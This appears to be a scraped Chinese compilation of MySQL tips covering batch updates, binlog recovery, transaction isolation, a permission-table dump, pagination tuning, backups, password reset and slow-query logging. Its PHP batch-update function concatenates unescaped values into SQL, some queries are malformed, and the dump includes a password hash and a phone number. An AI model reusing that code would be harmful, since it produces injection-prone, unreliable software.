`column1`,`column2`,`column3` ）values (1,2,3),(2,3,4),(5,6,7)INSERT INTO t1 (a,b,c) VALUES (1,2,3) ON DUPLICATE KEY UPDATE c=c+1;UPDATE t1 SET c=c+1 WHERE a=1;update table set column1 = case when column2 = 1 then 2 else 3 end ,column3 = case when column4 = 1 then 2 else 3 end where id in (1,2,3,4)//拼装按条件批量更新SQL语句protected function handleUpdate($data, $key) &#123; if (empty($data) || !is_array($data)) &#123; return false; &#125; $keys_array = array_keys(current($data));//需要被更新的字段 $update_column = [ $keys_array[5], $keys_array[6], $keys_array[8], $keys_array[9], $keys_array[16], $keys_array[14] ];//更新条件 $vehicle_id = $keys_array[2]; $body_color = $keys_array[3]; $interior_color = $keys_array[4]; $city_id = $keys_array[11]; $province_id = $keys_array[10]; $q = "UPDATE ce SET "; foreach ($update_column as $update_colum) &#123; $q .= ' ' . $update_colum . ' = CASE '; foreach ($data as $value) &#123; $value[$update_colum] = !isset($value[$update_colum]) || empty($value[$update_colum]) ? 0 : $value[$update_colum]; $q .= ' when ' . $vehicle_id . ' =' . $value[$vehicle_id] . ' and ' . $body_color . ' = "' . $value[$body_color] . '"' . ' and ' . $interior_color . ' = "' . $value[$interior_color] . '"' . ' and ' . $city_id . ' =' . $value[$city_id] . ' and ' . $province_id . ' =' . $value[$province_id] . ' then ' . $value[$update_colum]; &#125; $q .= " ELSE " . $update_colum . " END, "; &#125; $q = rtrim($q, ", "); &#125;https://dalebao.github.io/2019/04/27/MySQL%E6%89%B9%E9%87%8F%E6%9B%B4%E6%96%B0%E4%B8%8E%E6%8F%92%E5%85%A5/ 恢复误删的数据库12345678mysql -h127.0.0.1 -uroot -p del &lt; bak.sql误删后可以保存下binlogmysqlbinlog mysql-bin.000011 &gt; del.log打开文件，去掉drop操作并保存。mysql -h127.0.0.1 -uroot -p &lt;del.log当然，比较建议通过dump全备份操作，然后找出备份到drop的pos。 show processlist 神器1234567891011121314SELECT id, db, USER, HOST, command, time, state, info FROM information_schema. PROCESSLIST WHERE command != 'Sleep' ORDER BY time DESC;mysql&gt; show full processlist;+--------+------+----------------------+-------+---------+------+----------+-----------------------+| Id | User | Host | db | Command | Time | State | Info |+--------+------+----------------------+-------+---------+------+----------+-----------------------+| 449000 | root | 127.123.213.11:59828 | stark | Sleep | 1270 | | NULL |-- 查询执行时间超过3分钟的线程，然后拼接成 kill 语句select concat('kill ', id, ';')from information_schema.processlistwhere command != 'Sleep'and time &gt; 3*60order by time desc;https://learnku.com/articles/36035 like 条件的优化1234like 语句查询慢的可以尝试使用函数来查询，具体为 instr (字段名，' 值 ')&gt;0比如查询包含 “钟” 字的，instr (name, ' 钟 ') &gt; 0使用该函数后，查询仅需 0.031shttps://learnku.com/articles/36187 MySQL事务隔离1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980事务就是一组原子性的sql查询，或者说是一个独立的工作单元。简而言之，事务内的语句要么全部执行成功，要么全部执行失败。在Mysql中，事务支持是在引擎层实现的，但并不是所有的Mysql引擎都支持事务，比如MyISAM引擎就不支持事务，这也是MyISAM被InnoDB取代的重要原因之一。提到事务，我们肯定会想到ACID：原子性(Atomicity)一致性(Consistency)隔离性(Isolation)持久性(Durability)隔离级别当数据库中有多个事务同时执行时，就可能会出现脏读、不可重复读、幻读等问题，因为就有了事务隔离级别的概念。SQL标准正定义了四种隔离级别：READ UNCOMMITTED (未提交读)事务中的修改，即使还没有提交，对其他事务都是可见的。事务可以读取未提交的数据，也被称为脏读(Dirty Read)。READ COMMITTED(提交读)一个事务提交后，所做的变更才能被其他事务看到。这个级别也叫不可重复读，因为事务中执行2次相同的查询，可能得到的结果是不一样的。REPEATABLE READ(可重复读)一个事务执行的过程中，总是和这个事务在启动时看到的数据是一致的。当然在这个级别下，未提交的数据变更对其他事务也是不可见的。SERIALIZABLE(可串行化)对同一行记录，写和读都会加锁，当出现读写锁冲突时，后访问的事务必须等前一个事务执行完成才能继续执行，就会导致大量的超时和锁争用的问题。在实现上，数据库里面会创建一个视图，访问的时候以视图的逻辑为准。在可重复读这个隔离级别下，这个视图是事务开启的时候创建的，整个事务期间都用这个视图。在读提交的隔离级别下，这个视图是在sql语句开始执行的时候创建的。在读未提交的隔离级别下，直接返回记录上的最新值，没有视图概念。在串行化的隔离级别下，直接用加锁的方式避免并行访问。配置的方式是将启动参数transaction-isolation设置成想要的隔离级别。查看当前设置：mysql&gt; show variables like 'transaction_isolation';+-----------------------+-----------------+| Variable_name | Value |+-----------------------+-----------------+| transaction_isolation | REPEATABLE-READ |+-----------------------+-----------------+1 row in set (0.00 sec)总之，存在即合理，不同的隔离级别适用于不同的场景，具体我们应该根据业务场景来决定。事务隔离的实现在Mysql中，实际上每条记录的更新同时也会记录一条回滚操作，记录上的最新值通过回滚操作，都可以得到前一个状态的值。系统会自动判断，当没有事务再需要回滚日志时，会删除回滚日志。为什么不建议使用长事务：长事务意味着系统里面会存在很老的事务视图，由于这些事务随时可以访问数据库里面的任何数据，所以这个事务提交之前，数据库里可能用到的回滚记录必须保留着，这就会占用大量的存储空间。同时长事务还占用锁资源，也可能拖垮整个库。事务启动的方式显式启动事务语句，begin或者start transaction,提交就是commit,回滚用rollback。set autocommit = 0,这个命令会将线程的自动提交关掉，意味着如果执行一个select 语句，这个事务就启动了，并且不会自动提交，直到你主动执行commit或者rollback，或者断开连接。个人建议还是通过第一种方式显式启动事务，避免长事务的发生。在 set autocommit = 1 的情况下，用 begin 显式启动的事务，如果执行 commit 则提交事务。如果执行 commit work and chain，则是提交事务并自动启动下一个事务，这样也省去了再次执行 begin 语句的开销。查询长事务：下面语句是查询持续时间超过60s的事务mysql&gt; select * from information_schema.innodb_trx where TIME_TO_SEC(timediff(now(),trx_started))&gt;60;Empty set (0.00 sec)总结下来，我们在开发过程中，尽量少用长事务，如果无法避免，保证逻辑日志空间足够大，并且支持动态日志空间增长。监控Innodb_trx表，发现长事务报警from https://tsmliyun.github.io/mysql/MySQL%E4%BA%8B%E5%8A%A1%E9%9A%94%E7%A6%BB/ 后台权限表123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174DROP TABLE IF EXISTS `crm_admin_permission`;CREATE TABLE `crm_admin_permission` ( `id` int(10) unsigned NOT NULL AUTO_INCREMENT, `parent_id` int(11) NOT NULL DEFAULT 0, `title` varchar(50) NOT NULL DEFAULT '' COMMENT '标题', `icon` varchar(50) NOT NULL DEFAULT '', `path` varchar(50) NOT NULL DEFAULT '' COMMENT '路由', `is_menu` tinyint(4) NOT NULL DEFAULT 0 COMMENT '是否是菜单,1=&gt;是,0=&gt;否', `sort` int(11) NOT NULL DEFAULT 0 COMMENT '排序', `level` tinyint(4) NOT NULL DEFAULT 0 COMMENT '等级', `status` tinyint(4) NOT NULL DEFAULT 1 COMMENT '状态 1=&gt;启用 0=&gt;禁用', `created_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00', `updated_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, PRIMARY KEY (`id`), KEY `idx_parent_id` (`parent_id`), KEY `idx_path` (`path`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='菜单表';LOCK TABLES `crm_admin_permission` WRITE;/*!40000 ALTER TABLE `crm_admin_permission` DISABLE KEYS */;INSERT INTO `crm_admin_permission` (`id`, `parent_id`, `title`, `icon`, `path`, `is_menu`, `sort`, `level`, `status`, `created_at`, `updated_at`)VALUES (23,0,'管理员管理','','',1,0,1,1,'2019-05-20 18:37:40','2019-05-20 18:37:40'), (24,23,'管理员列表','','admin/admin/lists',1,1,2,1,'2019-05-20 18:38:31','2019-05-20 18:38:31'), (25,23,'角色管理','','admin/role/lists',1,2,2,1,'2019-05-20 18:38:59','2019-05-20 18:38:59'), (26,23,'权限管理','','admin/permission/lists',1,3,2,1,'2019-05-20 18:39:36','2019-05-20 18:39:36'), (27,24,'添加管理员','','admin/admin/create',0,0,3,1,'2019-05-20 18:41:44','2019-05-20 18:41:44'), (28,24,'编辑管理员','','admin/admin/edit',0,0,3,1,'2019-05-20 18:42:33','2019-05-20 18:42:33'), (29,25,'新增角色','','admin/role/create',0,0,3,1,'2019-05-20 18:43:42','2019-05-20 18:46:29'), (30,25,'编辑角色','','admin/role/edit',0,0,3,1,'2019-05-20 18:44:21','2019-05-20 18:46:30'), (36,25,'赋权','','admin/role/permission',0,0,3,1,'2019-05-20 18:46:49','2019-05-20 19:00:29'), (37,25,'赋权-提交','','admin/role/updatePermission',1,0,3,1,'2019-05-20 18:47:10','2019-05-20 18:47:10'), (31,26,'新增权限','','admin/permission/create',0,0,3,1,'2019-05-20 18:46:49','2019-05-20 19:00:29'), (32,26,'编辑权限','','admin/permission/edit',1,0,3,1,'2019-05-20 18:47:10','2019-05-20 18:47:10'), (33,0,'首页','','admin/index',0,0,1,1,'2019-05-20 23:51:37','2019-05-20 23:51:47'), (34,26,'新增权限-提交','','admin/permission/store',0,0,3,1,'2019-05-21 14:38:36','2019-05-21 14:38:36'), (35,26,'编辑权限-提交','','admin/permission/update',0,0,3,1,'2019-05-21 14:38:57','2019-05-21 14:38:57');/*!40000 ALTER TABLE `crm_admin_permission` ENABLE KEYS */;UNLOCK TABLES;# Dump of table crm_admin_role# ------------------------------------------------------------DROP TABLE IF EXISTS `crm_admin_role`;CREATE TABLE `crm_admin_role` ( `id` int(10) unsigned NOT NULL AUTO_INCREMENT, `name` varchar(50) NOT NULL DEFAULT '' COMMENT '角色名称', `status` tinyint(4) NOT NULL DEFAULT 1 COMMENT '状态 1=&gt;启用 0=&gt;禁用', `created_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00', `updated_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, PRIMARY KEY (`id`), UNIQUE KEY `unk_name` (`name`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='角色表';LOCK TABLES `crm_admin_role` WRITE;/*!40000 ALTER TABLE `crm_admin_role` DISABLE KEYS */;INSERT INTO `crm_admin_role` (`id`, `name`, `status`, `created_at`, `updated_at`)VALUES (1,'超级管理员',1,'2019-05-06 18:52:06','2019-05-07 16:56:26'), (2,'普通管理员',1,'2019-05-06 18:52:29','2019-05-06 18:52:29'), (8,'开发',1,'2019-05-20 16:50:40','2019-05-20 16:50:40');/*!40000 ALTER TABLE `crm_admin_role` ENABLE KEYS */;UNLOCK TABLES;# Dump of table crm_admin_role_permission# ------------------------------------------------------------DROP TABLE IF EXISTS `crm_admin_role_permission`;CREATE TABLE `crm_admin_role_permission` ( `id` int(10) unsigned NOT NULL AUTO_INCREMENT, `role_id` int(11) NOT NULL DEFAULT 0, `permission_id` int(11) NOT NULL DEFAULT 0, `created_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00', `updated_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, PRIMARY KEY (`id`), KEY `idx_role_id` (`role_id`), KEY `idx_permission_id` (`permission_id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='角色权限关联表';LOCK TABLES `crm_admin_role_permission` WRITE;/*!40000 ALTER TABLE `crm_admin_role_permission` DISABLE KEYS */;INSERT INTO `crm_admin_role_permission` (`id`, `role_id`, `permission_id`, `created_at`, `updated_at`)VALUES (12,2,20,'2019-05-20 18:04:36','2019-05-20 18:04:36'), (13,2,21,'2019-05-20 18:04:36','2019-05-20 18:04:36'), (14,2,22,'2019-05-20 18:04:36','2019-05-20 18:04:36'), (26,1,23,'2019-05-21 14:39:34','2019-05-21 14:39:34'), (27,1,24,'2019-05-21 14:39:34','2019-05-21 14:39:34'), (28,1,27,'2019-05-21 14:39:34','2019-05-21 14:39:34'), (29,1,28,'2019-05-21 14:39:34','2019-05-21 14:39:34'), (30,1,25,'2019-05-21 14:39:34','2019-05-21 14:39:34'), (31,1,29,'2019-05-21 14:39:34','2019-05-21 14:39:34'), (32,1,30,'2019-05-21 14:39:34','2019-05-21 14:39:34'), (33,1,26,'2019-05-21 14:39:34','2019-05-21 14:39:34'), (34,1,31,'2019-05-21 14:39:34','2019-05-21 14:39:34'), (35,1,32,'2019-05-21 14:39:34','2019-05-21 14:39:34'), (36,1,34,'2019-05-21 14:39:34','2019-05-21 14:39:34'), (37,1,35,'2019-05-21 14:39:34','2019-05-21 14:39:34'), (38,1,33,'2019-05-21 14:39:34','2019-05-21 14:39:34'), (39,1,36,'2019-05-21 14:39:34','2019-05-21 14:39:34'), (40,1,37,'2019-05-21 14:39:34','2019-05-21 14:39:34');/*!40000 ALTER TABLE `crm_admin_role_permission` ENABLE KEYS */;UNLOCK TABLES;# Dump of table crm_admin_user# ------------------------------------------------------------DROP TABLE IF EXISTS `crm_admin_user`;CREATE TABLE `crm_admin_user` ( `id` int(10) unsigned NOT NULL AUTO_INCREMENT, `username` varchar(32) NOT NULL DEFAULT '' COMMENT '登陆的用户名', `email` varchar(32) NOT NULL DEFAULT '' COMMENT 'email', `phone` char(11) NOT NULL DEFAULT '' COMMENT '电话号码', `password` char(60) NOT NULL DEFAULT '' COMMENT '密码', `status` tinyint(4) NOT NULL DEFAULT 1 COMMENT '1 =&gt; 启用 0=&gt;禁用', `created_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00', `updated_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, `deleted_at` datetime DEFAULT NULL, PRIMARY KEY (`id`), UNIQUE KEY `uk_email` (`email`) USING BTREE) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='管理员信息表';LOCK TABLES `crm_admin_user` WRITE;/*!40000 ALTER TABLE `crm_admin_user` DISABLE KEYS */;INSERT INTO `crm_admin_user` (`id`, `username`, `email`, `phone`, `password`, `status`, `created_at`, `updated_at`, `deleted_at`)VALUES (27,'li12312','1234@qq.com','15111179935','$2y$10$LFQrR5PWcsxSTYhNYG1tK.IipQHjiJsVakluH4F0iDK50rtUTMVfq',1,'2019-05-20 00:17:56','2019-05-20 11:45:59',NULL);/*!40000 ALTER TABLE `crm_admin_user` ENABLE KEYS */;UNLOCK TABLES;# Dump of table crm_admin_user_role# ------------------------------------------------------------DROP TABLE IF EXISTS `crm_admin_user_role`;CREATE TABLE `crm_admin_user_role` ( `id` int(10) unsigned NOT NULL AUTO_INCREMENT, `user_id` int(11) NOT NULL DEFAULT 0, `role_id` int(11) NOT NULL DEFAULT 0, `created_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00', `updated_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, PRIMARY KEY (`id`), KEY `idx_user_id` (`user_id`), KEY `idx_role_id` (`role_id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='用户角色关联表';LOCK TABLES `crm_admin_user_role` WRITE;/*!40000 ALTER TABLE `crm_admin_user_role` DISABLE KEYS */;INSERT INTO `crm_admin_user_role` (`id`, `user_id`, `role_id`, `created_at`, `updated_at`)VALUES (1,13,1,'2019-05-07 15:45:55','2019-05-07 15:45:55'), (9,1,1,'2019-05-07 16:33:18','2019-05-07 16:33:18'), (13,27,1,'2019-05-20 10:37:04','2019-05-20 10:37:04');/*!40000 ALTER TABLE `crm_admin_user_role` ENABLE KEYS */;UNLOCK TABLES;https://github.com/tsmliyun/laravel_quick_admin 取分组数据的前N条纪录12345678910111213141516171819202122232425262728293031323334353637383940414243CREATE TABLE tbl ( cate varchar(10), item int, note varchar(20));INSERT INTO tbl VALUES ('a', 2, 'a的第二个值'), ('a', 1, 'a的第一个值'), ('a', 3, 'a的第三个值'), ('b', 1, 'b的第一个值'), ('b', 3, 'b的第三个值'), ('b', 2, 'b的第二个值'), ('b', 4, 'b的第四个值'), ('b', 5, 'b的第五个值');取每个 cate item 最大/最小的那条记录mysql&gt; SELECT a.* FROM tbl a WHERE item = ( -&gt; SELECT MAX(item) FROM tbl WHERE cate = a.cate -&gt; ) ORDER BY a.cate;+------+------+------------------+| cate | item | note |+------+------+------------------+| a | 3 | a的第三个值 || b | 5 | b的第五个值 |+------+------+------------------+2 rows in set (0.01 sec)按 cate 分组取最大/最小的两个(N个)itemmysql&gt; SELECT a.* FROM tbl a WHERE EXISTS ( -&gt; SELECT COUNT(*) FROM tbl -&gt; WHERE cate = a.cate AND item &lt; a.item HAVING COUNT(*) &lt; 2 -&gt; ) ORDER BY a.cate, a.item;+------+------+------------------+| cate | item | note |+------+------+------------------+| a | 1 | a的第一个值 || a | 2 | a的第二个值 || b | 1 | b的第一个值 || b | 2 | b的第二个值 |+------+------+------------------+4 rows in set (0.00 sec)select from table awhere 2&gt;(select count() from table where bind_category_id=a.bind_category_idand created_at&gt;a.created_at)order by a.bind_category_idand ,a.created_at deschttps://learnku.com/laravel/t/36766https://n3xtchen.github.io/n3xtchen/postgresql/2015/08/13/pgsql-vs-mysql-get-nth-value-per-group MySQL 定时备份123456789101112131415161718#!/bin/bashbackupdir=/data/backuptime=`date +%Y-%m-%d-%H-%M`if [ ! -e /data/backcup ];then mkdir -p /data/backupfi/usr/bin/mysqldump --single-transaction --flush-logs --skip-add-drop-table -uroot -p'root@xx' 数据库 |bzip2 &gt; $backupdir/数据库$time.sql.bz2# 清理超过7天没使用的文件find $backupdir -name "数据库*.sql.bz2" -type f -mtime +7 -exec rm &#123;&#125; \; &gt; /dev/null 2&gt;&amp;1批注：--single-transaction参数的作用，设置事务的隔离级别为可重复读，即REPEATABLE READ，这样能保证在一个事务中所有相同的查询读取到同样的数据，也就大概保证了在dump期间，如果其他innodb引擎的线程修改了表的数据并提交，对该dump线程的数据并无影响--skip-add-drop-table ---取消每个数据表创建之前添加drop数据表语句(默认每个表之前存在drop语句)--flush-logs 在开始导出前刷新服务器的日志文件最后导出的数据库备份文件 就是这个 xx2019-11-14-02-00.sql.bz2mysql -u 用户名 -p密码 数据库名 &lt; 备份文件.sql 恢复某个节点数据https://learnku.com/articles/36965 MySQl事务最全详解123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990MySQL 中的事务有如下几个特点(ACID):原子性(atomicity):一个事务必须被作为一个不可分割的最小工作单元,每个事务中的所有操作必须要么成功,或者要么失败,永远不可能一些操作失败,一些操作成功,这就是所谓的原子性的概念.一致性(consistency):一致性就像上面举的一个例子一样,当发生异常情况下,数据仍然是正确的.就是说当一个事务执行失败了,数据之间是不会受异常的情况而影响,永远保持着他的正确性.隔离性(isolation):当一个事务还未提交,每个事务之间是相互隔离的,互补受到影响.持久性(durability):当一个事务进行提交之后,发生的变化就会永远保存在数据库中.事务的隔离级别可重复读(REPEATABLE READ)多次读取记录的结果都是一致的,可重复读可以解决上面的不可重复读的情况.但是有这样一种情况,当一个事务在读取某个范围的记录时,另外一个事务在这个范围内插入了一条新的数据,当事务再次进行读取数据时,发现比第一次读取记录多了一条,这就是所谓的幻读,两次读取的结果不一致.举例:小明女朋友在查看银行卡的记录时,看见有 5 条消费记录,此时小明正在消费,这时候消费记录里面记录了这条消费记录,当女朋友再次读取记录时,发现有 6 条记录了.MySQL 中事务隐式开启的,也就是说,一个 sql 语句就是一个事务,当 sql 语句执行完毕,事务就提交了.在演示的过程中,我们显式开启 上面提到了 MySQL 中事务是隐式开启的,则代表我们每一个 sql 是自动提交的,需要关闭则需要设置 autocommit 选项show variables like '%autocommit%';set autocommit = 0;// 查看当前的事务隔离级别mysql root@127.0.0.1:test&gt; select @@tx_isolation;// 连接MySQL$mysqli = new mysqli('127.0.0.1', 'root', '123456', 'test', 3306);// 关闭事务自动提交$mysqli-&gt;autocommit(false);// 1.开启事务$mysqli-&gt;begin_transaction();// 2.修改数据$mysqli-&gt;query("update user set age=10 where id=1");// 3.查看数据$mysqli-&gt;query("select * from user");// 4.事务回滚$mysqli-&gt;rollback();// 5.查看数据$mysqli-&gt;query("select * from user");// 7.修改数据$mysqli-&gt;query("update user set age=15 where id=1");// 8.事务提交$mysqli-&gt;commit();// 9.事务回滚$mysqli-&gt;rollback();// 10.查看数据https://learnku.com/articles/33749$mysqli-&gt;query("select * from user");READ COMMITTED（提交读），大多数数据库系统的默认隔离级别，一个事务开始时，只能 “看见” 已经提交的事务所做的修改，一个事务从开始直到提交之前，所做的任何修改对其他事务都是不可见的，也叫不可重复读（nonrepeatable read），有可能出现幻读（Phantom Read），指的是当某个事务在读取某个范围内的记录时，另外一个事务又在该范围内插入了新的记录，当之前的事务再次读取该范围的记录时，会产生幻行（Phantom Row）REPEATABLE READ（可重复读），通过 InnoDB 和 XtraDB 存储引擎，是 MySQL 的默认事务隔离级别，该级别保证了在同一个事物中多次读取同样记录的结果是一致的。解决了脏读，又通过多版本并发控制 mvcc 解决了幻读。https://learnku.com/articles/32336https://www.qqdeveloper.com/2019/08/18/MySQl%E4%BA%8B%E5%8A%A1%E6%9C%80%E5%85%A8%E8%AF%A6%E8%A7%A3/read uncommitted | 读未提交read committed | 读已提交repeatable read | 可重复读serializable | 串行化事务 A 读取了事务 B 更新的数据，然后事务 B 在某些因素下执行了回滚，那么事务 A 读取的数据就是不合理的，即脏数据。事务 A 需要重复多次读取某组数据，事务 A 在事务 B 对该组数据修改提交前后进行读取，很显然、两次读取的数据是不一致的，即不可重复读。侧重于元数据的修改。事务 A 在修改每一条元数据的时候，事务 B 在此时添加了一条新记录，事务 A 在处理的过程中突然多了一条数据，即幻读。侧重于数据的删除与修改。隔离级别越高，越能保证数据的完整性和一致性，但是对并发性能的影响也越大。 事务隔离级别为读提交时，写数据只会锁住相应的行 事务隔离级别为串行化时，读写数据都会锁住整张表 https://learnku.com/articles/24581 不可重复读的和幻读很容易混淆，不可重复读侧重于修改，幻读侧重于新增或删除。解决不可重复读的问题只需锁住满足条件的行，解决幻读需要锁表 https://learnku.com/articles/30933 MySQL大小写不敏感问题123456789101112131415161718show create table t3\G*************************** 1. row *************************** Table: t3Create Table: CREATE TABLE `t3` ( `a` varchar(20) CHARACTER SET utf8 COLLATE utf8_bin DEFAULT NULL, `b` varchar(20) DEFAULT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf81 row in set (0.00 sec)a列有个校验规则为collate utf8_bin的设置，这个就是在a列上查询可以区分大小写的原因。 可以通过show collation命令查看有哪些校验规则：mysql&gt; show collation like 'utf8%';通过show character set查看有哪些字符集：mysql&gt; show character set like 'utf8%';可以看到utf8的默认校验规则是utf8general_ci，想要设置在某一列上查询区分大小写，可能通过对列指定collate utf8_bin来解决。https://www.daemoncoder.com/a/MySQL%E5%A4%A7%E5%B0%8F%E5%86%99%E4%B8%8D%E6%95%8F%E6%84%9F%E9%97%AE%E9%A2%98/4e413d3d MySQL分页offset过大性能问题与优化12345678910111213141516SELECT b FROM t WHERE c&lt;1000 LIMIT 2000000, 500可以看到这个一个分页查询，从位置2000000处开始，取500条数据，问题的原因正是这个过大的分页起点导致。mysql分页查询会并不是直接跳过前2000000再取出500条数据，而是把前2000000条和后面的500条都取出来，再把前2000000条抛弃，这样的话，上面的慢查询相当于从表中取2000500条数据，这么大的数据量必然会慢。解决方案sql修改为：SELECT b FROM (SELECT a FROM t WHERE c&lt;1000 LIMIT 2000000, 500) ta INNER JOIN t tb ON ta.a = tb.a这种方式先用一个子查询表的主键（还是和原来一样带有过大分页），结果做为一个临时表，再和原来的t表JOIN，查出需要的字段。这种方式不仔细看的话，也是要查出2000500条数据，因为子任务的where和limit设置和原来一样，关键就在于子任务SELECT出来的是a字段（t表的主键），而不是像原来直接b字段，这样查出500条数据后再和原有的表join再查出需要的数据字段b，下面详细分析下这个细节带来的性能差异。基础知识：innodb的索引分为聚集索引和辅助索引，innodb是用聚集索引组织数据的，辅助索引上只存了一个主键，按辅助索引查询数据时，先从辅助索引对应记录的主键，再用主键去聚集索引查具体的数据字段。（这里不详细分析两个种索引的区别，不了解可以自行百度）上面的慢sql会从辅助索上查2000500条数据，对于每一条数据还要从聚集索引上查一次。修改后的sql会从辅助索引上查出2000500条主键，由于辅助索引上本身就有主键，所以这2000500无需再去聚集索引查，生成临时表后再把这500条数据去聚集索引查出b字段，sql从聚集索引中查2000500条数据变成了只需要查500条，并且b字段在真实的情况往往是大量数据的字段，因此修改前后的sql性能差别很大（这里我理解修改前的sql按辅助索引顺序查询时，再去查聚集索引就不再是顺序读了，而是随机的离散读，也是一部分性能差的原因，具体只是自己的猜测，没有验证）。https://www.daemoncoder.com/a/MySQL%E5%88%86%E9%A1%B5offset%E8%BF%87%E5%A4%A7%E6%80%A7%E8%83%BD%E9%97%AE%E9%A2%98%E4%B8%8E%E4%BC%98%E5%8C%96/4d513d3d MySQL 反向模糊查找1234567假如数据库我们只存一条记录, 不管用户输入, 大卫还是大卫王我们都会回复它同一个内容.这时候我们只需要反向模糊查找即可表数据如下id keyword reply1 %大卫% 他就是大卫select * from table_name where '大卫' like keywordhttp://www.shiguopeng.cn/archives/379 大表分页查询调研12345678910111213141516171819mysql&gt; explain select * from user_status_record_1 order by id limit 5000000,5;+----+-------------+----------------------+-------+---------------+---------+---------+------+---------+-------+| id | select_type | table | type | possible_keys | key | key_len | ref | rows | Extra |+----+-------------+----------------------+-------+---------------+---------+---------+------+---------+-------+| 1 | SIMPLE | user_status_record_1 | index | NULL | PRIMARY | 8 | NULL | 5000005 | |+----+-------------+----------------------+-------+---------------+---------+---------+------+---------+-------+1 row in set (0.01 sec)mysql&gt; explain SELECT * FROM anti_health_rate_43 WHERE id &gt;=(select id from anti_health_rate_43 limit 2000010, 1) limit 5;+----+-------------+---------------------+-------+---------------+----------------+---------+------+---------+-------------+| id | select_type | table | type | possible_keys | key | key_len | ref | rows | Extra |+----+-------------+---------------------+-------+---------------+----------------+---------+------+---------+-------------+| 1 | PRIMARY | anti_health_rate_43 | range | PRIMARY | PRIMARY | 8 | NULL | 1779770 | Using where || 2 | SUBQUERY | anti_health_rate_43 | index | NULL | idx_create_day | 4 | NULL | 3559541 | Using index |+----+-------------+---------------------+-------+---------------+----------------+---------+------+---------+-------------+2 rows in set (0.27 sec)$ret = select id from table order by aaa limit 100,10select * from table where id in ( $ret );https://bettercuicui.github.io/2018/04/01/MYSQL/%E5%A4%A7%E8%A1%A8%E5%88%86%E9%A1%B5%E6%9F%A5%E8%AF%A2%E8%B0%83%E7%A0%94/ 修改密码1234567891011先把root的旧密码置空use mysql;update user set authentication_string='' where user='root';备注：Mysql5.7+ password字段 已改成 authentication_string字段重置成新密码alter user 'root'@'localhost' identified by 'newpassword';备注：Mysql8.0修改密码方式已有变化（此处是个坑，需要注意）Mysql8.0之前：update user set password=password('root') where user='root';mysql -uroot -proothttps://learnku.com/articles/38466 https://learnku.com/articles/38455 Orderby 排序优化123456789101112131415161718192021222324252627Create Table: CREATE TABLE `user` (`id` int(10) unsigned NOT NULL AUTO_INCREMENT,`name` varchar(20) NOT NULL,`age` int(10) NOT NULL DEFAULT '0',`city` varchar(20) NOT NULL,`addr` varchar(50) DEFAULT NULL,PRIMARY KEY (`id`),KEY `idx_name_age_city` (`name`,`age`,`city`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ciorder by 能使用索引最左前缀* select id,name,age,city from user order by name;* select id,name,age,city from user order by name,age,city;* explain select id,name,age,city from user order by name desc,age desc,city desc如果 where 使用索引的最左前缀定义为常量，则 order by 能使用索引* select * from user where name = 'zhangsan' order by age,city;* select * from user where name = 'zhangsan' and age = 20 order by city;* select * from user where name = 'zhangsan' and age &gt; 20 order by age,city;不能使用索引进行排序select * from user order by name,age,city;//query*字段select * from user order by addr;//非索引字段排序select * from user order by name,addr;//含有非索引字段select * from user where age = 20 order by city;//跳过了name字段，违反最左前缀法则select * from user where name = 'zhangsan' order by city;//跳过了age字段，违反最左前缀法则select * from user where name = 'zhangsan' order by age,addr;//含有非索引字段https://learnku.com/articles/38925 更新同一个表不同字段1update diag_product_list_ios as a join (select soft_package_id,soft_name from diag_product_list_ios where pdt_code='ThinkDiag' ) as b on a.soft_package_id=b.soft_package_id set a.soft_name=b.soft_name where a.pdt_code='EASYDIAG4' and a.soft_name is null 慢查询分析调优工具12345678910111213141516171819202122232425262728show variables like 'profiling%';//默认关闭，保存近15次的运行结果set profiling = on;show profiles;备注：show warnings;//可以显示警告和报错的信息show profile cpu,block io for query 3;通过Status一列，可以看到整条SQL的运行过程如出现以下一种或者几种情况，说明SQL执行性能极其低下，亟需优化* converting HEAP to MyISAM //查询结果太大，内存都不够用了往磁盘上搬了* Creating tmp table //创建临时表：拷贝数据到临时表，用完再删* Copying to tmp table on disk //把内存中临时表复制到磁盘，危险* locked //出现死锁select * from information_schema.profiling;记录sql到数据库（建议只在测试库环境进行）方式1:命令行1. set global general_log = 1;2. set global log_output = 'TABLE';方式2:配置文件* vim my.cnfgeneral_log =1general_log_file = /path/logfilelog_output = FILE* 重启MySQL服务诊断 SQLselect * from mysql.general_log;https://learnku.com/articles/39087 慢查询分析调优工具1234567891011121314151617181920212223242526272829303132show variables like '%slow_query_log%';* slow_query_log //是否开启，默认关闭，建议调优时才开启* slow_query_log_file //慢查询日志存放目录set global slow_query_log =1; //只对当前会话生效，重启失效show variables like 'long_query_time%';//查看阀值（大于），默认10sset global long_query_time = 3 //设置慢查询阀值如何把未使用索引的 SQL 记录写入慢查询日志show variables like 'log_queries_not_using_indexes'; //查看设置，默认关闭set global log_queries_not_using_indexes = on; //设置select 